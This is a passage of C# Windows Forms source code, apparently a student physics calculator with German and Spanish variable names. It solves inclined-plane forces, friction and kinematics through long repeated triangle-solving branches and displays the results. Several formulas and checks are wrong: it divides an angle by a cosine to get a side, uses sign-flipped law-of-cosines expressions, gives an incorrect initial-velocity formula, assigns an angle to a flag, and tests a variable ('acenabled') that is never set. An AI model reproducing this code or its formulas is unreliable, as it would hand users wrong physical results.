                    else if (Fnenabled == 1)
                    {
                        Ffkoeffizient = Ff / Fn;
                        Ffkoeffizientenabled = 1;
                    }
                }
                else if (Ffkoeffizientenabled == 1)
                {
                    if (Fnenabled == 1)
                    {
                        Ff = Fn * Ffkoeffizient;
                        Ffenabled = 1;
                    }
                }
                //next

                if (Fpenabled == 1)
                {
                    if (Wenabled == 1)
                    {
                        angulobogenmass = Math.Asin(Fp / W);
                        angulobogenmassenabled = 1;
                    }
                    else if (angulobogenmassenabled == 1)
                    {
                        W = Fp / Math.Sin(angulobogenmass);
                        Wenabled = 1;
                    }
                }
                else if (Wenabled == 1)
                {
                    if (angulobogenmassenabled == 1)
                    {
                        Fp = W * Math.Sin(angulobogenmass);
                        Fpenabled = 1;
                    }
                }
                //next

                if (Frenabled == 1)
                {
                    if (massaenabled == 1)
                    {
                        ac = Fr / massa;
                        aenabled = 1;
                    }
                    else if (aenabled == 1)
                    {
                        massa = Fr / ac;
                        massaenabled = 1;
                    }
                }
                else if (massaenabled == 1)
                {
                    if (aenabled == 1)
                    {
                        Fr = ac * massa;
                        Frenabled = 1;
                    }
                }


                //trangulofunktion mit kräften

                alphaenabled = 0;
                betaenabled = 0;
                deltaenabled = 0;
                aenabled = 0;
                benabled = 0;
                cenabled = 0;
                //Daten werden übergeben
                a = Fn;
                b = Fp;
                c = W;
                angulo = (angulobogenmass * 180) / Math.PI;
                beta = angulo;
                delta = 90;

                if (Fnenabled == 1)
                {
                    aenabled = 1;
                }
                if (Fpenabled == 1)
                {
                    benabled = 1;
                }
                if (Wenabled == 1)
                {
                    cenabled = 1;
                }
                if (angulobogenmassenabled == 1)
                {
                    betaenabled = 1;
                }
                deltaenabled = 1;
                // zuweisung ende. Ab jetzt alles automatisch

                alphabm = (alpha * Math.PI) / 180;
                betabm = (beta * Math.PI) / 180;
                deltabm = (delta * Math.PI) / 180;

                if (acenabled + benabled + cenabled + alphaenabled + betaenabled + deltaenabled <= 2)
                {
                }
                else
                {

                    if (acenabled == 1)
                    {
                        if (benabled == 1)
                        {
                            if (cenabled == 1)
                            {

                                alphabm = Math.Asin(ac / c);
                                betabm = Math.Acos(ac / c);
                                deltabm = Math.PI - (alphabm + betabm);
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                            else if (alphaenabled == 1)
                            {
                                betabm = Math.Atan(b / ac);
                                deltabm = Math.PI - (betabm + alphabm);
                                c = alphabm / Math.Cos(betabm);
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                            else if (betaenabled == 1)
                            {
                                alphabm = Math.Atan(ac / b);
                                deltabm = Math.PI - (betabm + alphabm);
                                c = alphabm / Math.Cos(betabm);
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                            else if (deltaenabled == 1)
                            {
                                c = Math.Sqrt((ac * ac) + (b * b) - (2 * ac * b * Math.Cos(deltabm)));
                                alphabm = Math.Asin(ac / c);
                                betabm = Math.Acos(ac / c);
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                        }
                        else if (cenabled == 1)
                        {
                            if (alphaenabled == 1)
                            {
                                betabm = Math.Acos(ac / c);
                                deltabm = Math.PI - (alphabm + betabm);
                                b = Math.Sqrt((c * c) - (ac * ac) - (2 * ac * c * Math.Cos(betabm)));
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                            else if (betaenabled == 1)
                            {
                                alphabm = Math.Asin(ac / c);
                                deltabm = Math.PI - (alphabm + betabm);
                                b = Math.Sqrt((c * c) - (ac * ac) - (2 * ac * c * Math.Cos(betabm)));
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                            else if (deltaenabled == 1)
                            {
                                betabm = Math.Acos(ac / c);
                                alphabm = Math.PI - (betabm + deltabm);
                                b = Math.Sqrt((c * c) - (ac * ac) - (2 * ac * c * Math.Cos(betabm)));
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                        }
                        else if (alphaenabled == 1)
                        {
                            if (betaenabled == 1)
                            {
                                deltabm = Math.PI - (alphabm + betabm);
                                c = ac / Math.Sin(alphabm);
                                b = Math.Tan(betabm) * ac;
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                            else if (deltaenabled == 1)
                            {
                                betabm = Math.PI - (alphabm + deltabm);
                                c = ac / Math.Sin(alphabm);
                                b = Math.Tan(betabm) * ac;
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                        }
                        else if (betaenabled == 1)
                        {
                            alphabm = Math.PI - (betabm + deltabm);
                            c = ac / Math.Sin(alphabm);
                            b = Math.Tan(betabm) * ac;
                            aenabled = 1;
                            benabled = 1;
                            cenabled = 1;
                            alphaenabled = 1;
                            betaenabled = 1;
                            deltaenabled = 1;
                        }
                    }
                    else if (benabled == 1)
                    {
                        if (cenabled == 1)
                        {
                            if (alphaenabled == 1)
                            {
                                ac = Math.Sin(alphabm) * c;
                                betabm = Math.Acos(ac / c);
                                deltabm = Math.PI - (alphabm + betabm);
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                            else if (betaenabled == 1)
                            {
                                alphabm = Math.Acos(b / c);
                                deltabm = Math.PI - (alphabm + betabm);
                                ac = Math.Sqrt((c * c) - (b * b) - (2 * c * b * Math.Cos(alphabm)));
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                            else if (deltaenabled == 1)
                            {
                                alphabm = Math.Acos(b / c);
                                betaenabled = Math.PI - (alphabm + deltabm);
                                ac = Math.Sqrt((c * c) - (b * b) - (2 * c * b * Math.Cos(alphabm)));
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                        }
                        else if (alphaenabled == 1)
                        {
                            if (betaenabled == 1)
                            {
                                deltabm = Math.PI - (alphabm + betabm);
                                c = b / Math.Cos(alphabm);
                                ac = Math.Cos(betabm) * c;
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                            else if (deltaenabled == 1)
                            {
                                betabm = Math.PI - (deltabm + alphabm);
                                c = b / Math.Cos(alphabm);
                                ac = Math.Cos(betabm) * c;
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                        }
                        else if (betaenabled == 1)
                        {
                            alphabm = Math.PI - (betabm + deltabm);
                            c = b / Math.Cos(alphabm);
                            ac = Math.Cos(betabm) * c;
                            aenabled = 1;
                            benabled = 1;
                            cenabled = 1;
                            alphaenabled = 1;
                            betaenabled = 1;
                            deltaenabled = 1;
                        }
                    }
                    else if (cenabled == 1)
                    {
                        if (alphaenabled == 1)
                        {
                            if (betaenabled == 1)
                            {
                                deltabm = Math.PI - (alphabm + betabm);
                                ac = Math.Cos(betabm) * c;
                                b = Math.Cos(alphabm) * c;
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                            else if (deltaenabled == 1)
                            {
                                betabm = Math.PI - (alphabm + deltabm);
                                ac = Math.Cos(betabm) * c;
                                b = Math.Cos(alphabm) * c;
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                        }
                        else
                        {
                            alphabm = Math.PI - (betabm + deltabm);
                            ac = Math.Cos(betabm) * c;
                            b = Math.Cos(alphabm) * c;
                            aenabled = 1;
                            benabled = 1;
                            cenabled = 1;
                            alphaenabled = 1;
                            betaenabled = 1;
                            deltaenabled = 1;
                        }
                    }
                }
                if (acenabled + benabled + cenabled + alphaenabled + betaenabled + deltaenabled == 6)
                {
                    alpha = (alphabm * 180) / Math.PI;
                    beta = (betabm * 180) / Math.PI;
                    delta = (deltabm * 180) / Math.PI;
                    // Rückgabe Werte
                    Fn = a;
                    Fp = b;
                    W = c;
                    angulo = beta;
                    angulobogenmass = (angulo * Math.PI) / 180;
                    Fnenabled = 1;
                    Fpenabled = 1;
                    Wenabled = 1;
                    angulobogenmassenabled = 1;
                }



                if (aenabled == 1)
                {
                    if (distanciaenabled == 1)
                    {
                        if (velocidadfinalenabled == 1)
                        {
                            velocidadinitial =  Math.Sqrt(velocidadfinal*velocidadfinal)/(2*ac*distancia);
                            velocidadinitialenabled = 1;
                        }
                        else if (velocidadinitialenabled == 1)
                        {
                            velocidadfinal = Math.Sqrt((2*ac*distancia) + (velocidadinitial*velocidadinitial));
                            velocidadfinalenabled = 1;
                        }
                    }
                    else if (velocidadfinalenabled == 1)
                    {
                        if (velocidadinitialenabled == 1)
                        {
                            distancia = ((velocidadfinal*velocidadfinal)-(velocidadinitial*velocidadinitial))/(2*ac);
                            distanciaenabled = 1;
                        }
                    }
                }
                else if (distanciaenabled == 1)
                {
                    if (velocidadfinalenabled == 1)
                    {
                        if (velocidadinitialenabled == 1)
                        {
                            ac = ((velocidadfinal*velocidadfinal)-(velocidadinitial*velocidadinitial))/(2*distancia);
                        }
                    }
                }
                //next

                if (distanciaenabled == 1)
                {
                    if (tiempoenabled == 1)
                    {
                        ac = (2*distancia)/(tiempo*tiempo);
                        aenabled = 1;
                    }
                    else if (aenabled == 1)
                    {
                        tiempo = Math.Sqrt((2*distancia)/ac);
                        tiempoenabled = 1;
                    }
                }
                else if (tiempoenabled == 1)
                {
                    if (aenabled == 1)
                    {
                        distancia = (ac*(tiempo*tiempo))/2;
                        distanciaenabled = 1;
                    }
                }

                //next
                //triangulo für sttrecke


                alphaenabled = 0;
                betaenabled = 0;
                deltaenabled = 0;
                aenabled = 0;
                benabled = 0;
                cenabled = 0;
                //Daten werden übergeben
                angulo = (angulobogenmass * 180) / Math.PI;
                a = x;
                b = altura;
                c = distancia;
                beta = angulo;
                delta = 90;

                if (xenabled == 1)
                {
                    aenabled = 1;
                }
                if (alturaenabled == 1)
                {
                    benabled = 1;
                }
                if (distanciaenabled == 1)
                {
                    cenabled = 1;
                }
                if (angulobogenmassenabled == 1)
                {
                    betaenabled = 1;
                }
                deltaenabled = 1;
                // zuweisung ende. Ab jetzt alle automatisch

                alphabm = (alpha * Math.PI) / 180;
                betabm = (beta * Math.PI) / 180;
                deltabm = (delta * Math.PI) / 180;
                
                if (acenabled + benabled + cenabled + alphaenabled + betaenabled + deltaenabled <= 2)
                {
                }
                else
                {

                    if (acenabled == 1)
                    {
                        if (benabled == 1)
                        {
                            if (cenabled == 1)
                            {

                                alphabm = Math.Asin(ac / c);
                                betabm = Math.Acos(ac / c);
                                deltabm = Math.PI - (alphabm + betabm);
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                            else if (alphaenabled == 1)
                            {
                                betabm = Math.Atan(b / ac);
                                deltabm = Math.PI - (betabm + alphabm);
                                c = alphabm / Math.Cos(betabm);
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                            else if (betaenabled == 1)
                            {
                                alphabm = Math.Atan(ac / b);
                                deltabm = Math.PI - (betabm + alphabm);
                                c = alphabm / Math.Cos(betabm);
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                            else if (deltaenabled == 1)
                            {
                                c = Math.Sqrt((ac * ac) + (b * b) - (2 * ac * b * Math.Cos(deltabm)));
                                alphabm = Math.Asin(ac / c);
                                betabm = Math.Acos(ac / c);
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                        }
                        else if (cenabled == 1)
                        {
                            if (alphaenabled == 1)
                            {
                                betabm = Math.Acos(ac / c);
                                deltabm = Math.PI - (alphabm + betabm);
                                b = Math.Sqrt((c * c) - (ac * ac) - (2 * ac * c * Math.Cos(betabm)));
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                            else if (betaenabled == 1)
                            {
                                alphabm = Math.Asin(ac / c);
                                deltabm = Math.PI - (alphabm + betabm);
                                b = Math.Sqrt((c * c) - (ac * ac) - (2 * ac * c * Math.Cos(betabm)));
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                            else if (deltaenabled == 1)
                            {
                                betabm = Math.Acos(ac / c);
                                alphabm = Math.PI - (betabm + deltabm);
                                b = Math.Sqrt((c * c) - (ac * ac) - (2 * ac * c * Math.Cos(betabm)));
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                        }
                        else if (alphaenabled == 1)
                        {
                            if (betaenabled == 1)
                            {
                                deltabm = Math.PI - (alphabm + betabm);
                                c = ac / Math.Sin(alphabm);
                                b = Math.Tan(betabm) * ac;
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                            else if (deltaenabled == 1)
                            {
                                betabm = Math.PI - (alphabm + deltabm);
                                c = ac / Math.Sin(alphabm);
                                b = Math.Tan(betabm) * ac;
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                        }
                        else if (betaenabled == 1)
                        {
                            alphabm = Math.PI - (betabm + deltabm);
                            c = ac / Math.Sin(alphabm);
                            b = Math.Tan(betabm) * ac;
                            aenabled = 1;
                            benabled = 1;
                            cenabled = 1;
                            alphaenabled = 1;
                            betaenabled = 1;
                            deltaenabled = 1;
                        }
                    }
                    else if (benabled == 1)
                    {
                        if (cenabled == 1)
                        {
                            if (alphaenabled == 1)
                            {
                                ac = Math.Sin(alphabm) * c;
                                betabm = Math.Acos(ac / c);
                                deltabm = Math.PI - (alphabm + betabm);
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                            else if (betaenabled == 1)
                            {
                                alphabm = Math.Acos(b / c);
                                deltabm = Math.PI - (alphabm + betabm);
                                ac = Math.Sqrt((c * c) - (b * b) - (2 * c * b * Math.Cos(alphabm)));
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                            else if (deltaenabled == 1)
                            {
                                alphabm = Math.Acos(b / c);
                                betaenabled = Math.PI - (alphabm + deltabm);
                                ac = Math.Sqrt((c * c) - (b * b) - (2 * c * b * Math.Cos(alphabm)));
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                        }
                        else if (alphaenabled == 1)
                        {
                            if (betaenabled == 1)
                            {
                                deltabm = Math.PI - (alphabm + betabm);
                                c = b / Math.Cos(alphabm);
                                ac = Math.Cos(betabm) * c;
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                            else if (deltaenabled == 1)
                            {
                                betabm = Math.PI - (deltabm + alphabm);
                                c = b / Math.Cos(alphabm);
                                ac = Math.Cos(betabm) * c;
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                        }
                        else if (betaenabled == 1)
                        {
                            alphabm = Math.PI - (betabm + deltabm);
                            c = b / Math.Cos(alphabm);
                            ac = Math.Cos(betabm) * c;
                            aenabled = 1;
                            benabled = 1;
                            cenabled = 1;
                            alphaenabled = 1;
                            betaenabled = 1;
                            deltaenabled = 1;
                        }
                    }
                    else if (cenabled == 1)
                    {
                        if (alphaenabled == 1)
                        {
                            if (betaenabled == 1)
                            {
                                deltabm = Math.PI - (alphabm + betabm);
                                ac = Math.Cos(betabm) * c;
                                b = Math.Cos(alphabm) * c; 
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                            else if (deltaenabled == 1)
                            {
                                betabm = Math.PI - (alphabm + deltabm);
                                ac = Math.Cos(betabm) * c;
                                b = Math.Cos(alphabm) * c;
                                aenabled = 1;
                                benabled = 1;
                                cenabled = 1;
                                alphaenabled = 1;
                                betaenabled = 1;
                                deltaenabled = 1;
                            }
                        }
                        else
                        {
                            alphabm = Math.PI - (betabm + deltabm);
                            ac = Math.Cos(betabm) * c;
                            b = Math.Cos(alphabm) * c;
                            aenabled = 1;
                            benabled = 1;
                            cenabled = 1;
                            alphaenabled = 1;
                            betaenabled = 1;
                            deltaenabled = 1;
                        }
                    }
                }
                if (acenabled + benabled + cenabled + alphaenabled + betaenabled + deltaenabled == 6)
                {
                    alpha = (alphabm * 180) / Math.PI;
                    beta = (betabm * 180) / Math.PI;
                    delta = (deltabm * 180) / Math.PI;
                    // Rückgabe Werte
                    x = a;
                    altura = b;
                    distancia = c;
                    angulo = beta;
                    angulobogenmass = (angulo * Math.PI) / 180;
                    xenabled = 1;
                    alturaenabled = 1;
                    distanciaenabled = 1;
                    angulobogenmassenabled = 1;
                }
            
            //tringulofunktion fertig


                progressBar1.Value = progressBar1.Value + 1;
                if (progressBar1.Value == 100)
                {
                    angulo = (angulobogenmass * 180) / Math.PI;
                    richTextBox34.Text = velocidadinitial.ToString();
                    richTextBox35.Text = velocidadfinal.ToString();
                    richTextBox36.Text = altura.ToString();
                    richTextBox37.Text = angulo.ToString();
                    richTextBox38.Text = massa.ToString();
                    richTextBox39.Text = tiempo.ToString();
                    richTextBox40.Text = distancia.ToString();
                    richTextBox41.Text = Fn.ToString();
                    richTextBox42.Text = Ff.ToString();
                    richTextBox43.Text = W.ToString();
                    richTextBox44.Text = Fp.ToString();
                    richTextBox45.Text = Ffkoeffizient.ToString();
                    richTextBox46.Text = Fr.ToString();
                    richTextBox47.Text = ac.ToString();
                    richTextBox48.Text = GlobalClass.gravity.ToString();
                    richTextBox49.Text = x.ToString();
                    progressBar1.Value = 0;
                    return;
                }

            }

        }

        private void Form1_Activated(object sender, EventArgs e)
        {
            richTextBox48.Text = GlobalClass.gravity.ToString();
            richTextBox25.Text = GlobalClass.gravity.ToString();
        }

        private void button12_Click(object sender, EventArgs e)
        {
            richTextBox34.Text = "";
            richTextBox35.Text = "";
            richTextBox36.Text = "";
            richTextBox37.Text = "";
            richTextBox38.Text = "";
            richTextBox39.Text = "";
            richTextBox40.Text = "";
            richTextBox41.Text = "";
            richTextBox42.Text = "";
            richTextBox43.Text = "";
            richTextBox44.Text = "";
            richTextBox45.Text = "";
            richTextBox46.Text = "";
            richTextBox47.Text = "";
            richTextBox48.Text = GlobalClass.gravity.ToString();
            richTextBox49.Text = "";
        }
        
    }
 }